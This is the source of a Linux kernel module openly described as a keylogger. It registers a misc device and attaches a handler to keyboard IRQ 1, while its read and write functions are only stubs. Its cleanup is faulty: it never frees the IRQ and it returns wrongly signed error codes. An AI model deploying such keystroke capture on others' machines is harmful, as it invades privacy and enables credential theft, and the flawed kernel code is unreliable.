// SPDX-License-Identifier: GPL-2.0
#include "keyboard.h"

#define KBD_IRQ 1

MODULE_LICENSE("GPL");
MODULE_AUTHOR("jbettini");
MODULE_DESCRIPTION("Keylogger");


////////////////////////////////////////////////////////////
// Misc Device Part

static int my_open(struct inode *node, struct file *file)
{
	printk(KERN_INFO "Misc Device number %d %d - Open function called\n", imajor(node), iminor(node));
	if (file->f_mode & FMODE_READ)
		printk(KERN_INFO "Misc Device - Open function called with read permissions\n");
	if (file->f_mode & FMODE_WRITE)
		return -EPERM;
	return 0;
}


static int my_close(struct inode *node, struct file *file)
{
	printk(KERN_INFO "Misc Device number %d %d - Close function called\n", imajor(node), iminor(node));
	return 0;
}


static ssize_t my_write(struct file *file, const char __user *user_buf, size_t user_len, loff_t *ppos)
{
	printk(KERN_INFO "Misc Device : Hello from Write\n");
	return 0;
}


static ssize_t my_read(struct file *file, char __user *user_buf, size_t user_len, loff_t *ppos)
{
	printk(KERN_INFO "Misc Device : Hello from Read\n");
	return 0;
}


static const struct file_operations fops = {
	.owner = THIS_MODULE,
	.write = my_write,
	.read = my_read,
	.open = my_open,
	.release = my_close,
};


static struct miscdevice my_misc = {
	.name = "Keylogger_Misc",
	.minor = MISC_DYNAMIC_MINOR,
	.fops = &fops,
};


// Misc Device Part
////////////////////////////////////////////////////////////


static int __init entrypoint(void)
{
	int status = misc_register(&my_misc);

	if (status) {
		printk(KERN_ALERT "Error: misc register failed\n");
		return -status;
	}
	printk(KERN_INFO "Misc Device Registred at /dev/Keylogger_Misc\n");
	keyboard_init_released();
	status = request_irq(KBD_IRQ, keyboard_handler, IRQF_SHARED, "keylogger_irq", &my_misc);
	if (status) {
		printk(KERN_ALERT "Error: irq register failed\n");
		return -status;
	}

	return 0;
}


static void __exit clean(void)
{
	misc_deregister(&my_misc);
	printk(KERN_INFO "Exiting: cleaning up module\n");
}

module_init(entrypoint);
module_exit(clean);
